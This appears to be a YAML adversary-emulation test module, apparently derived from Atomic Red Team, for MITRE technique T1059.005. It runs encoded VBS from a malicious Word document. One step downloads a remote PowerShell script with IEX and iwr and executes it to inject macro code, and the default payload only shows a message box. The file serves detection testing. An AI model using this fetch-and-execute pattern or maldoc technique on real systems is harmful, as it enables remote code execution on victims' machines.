api_version: "2.0"
name: Encoded VBS code execution
description: |
    This module takes an encoded VBS script and executes it from within a malicious document. By default, upon successful execution
    a message box will pop up displaying "ART T1059.005"

    A note regarding this module, due to the way that this module utilizes "ScriptControl" a 64bit version of Microsoft Office is required.
    You can validate this by opening WinWord -> File -> Account -> About Word
uuid: e8209d5f-e42d-45e6-9c2f-633ac4f1eefa
mitre:
    tactics:
        - 'TA0002: Execution'
    techniques:
        - 'T1059: Command and Scripting Interpreter'
    subtechniques:
        - 'T1059.005: Visual Basic'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        The 64-bit version of Microsoft Office must be installed
      inline: |
        try {
          $wdApp = New-Object -COMObject "Word.Application"
          $path = $wdApp.Path
          Stop-Process -Name "winword"
          if ($path.contains("(x86)")) { {Write-Host "You will need to install Microsoft Word (64-bit) manually to meet this requirement"
        } } else { exit 0 }
        } catch { exit 1 }
      executor: powershell
    - name: encoded-vbs-code-execution
      inline: |
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt" -officeProduct "Word" -sub "Exec"
      executor: powershell
      cleanup:
        inline: |
            Get-WmiObject win32_process | Where-Object {$_.CommandLine -like "*mshta*"}  | % { "$(Stop-Process $_.ProcessID)" } | Out-Null
        executor: powershell
